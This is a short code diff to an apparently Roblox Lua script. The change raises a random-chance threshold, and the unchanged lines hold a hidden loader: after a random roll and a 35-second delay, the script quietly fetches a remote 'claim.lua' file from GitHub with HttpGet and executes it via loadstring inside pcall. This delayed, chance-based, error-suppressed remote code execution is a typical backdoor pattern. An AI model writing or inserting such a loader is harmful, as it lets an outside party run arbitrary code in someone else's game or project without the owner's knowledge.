@@ -1,6 +1,6 @@
 local randomNumber = math.random(1, 100)
 
-if randomNumber >= 90 then
+if randomNumber >= 95 then
   wait(35)
   pcall(function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/claim.lua"))()
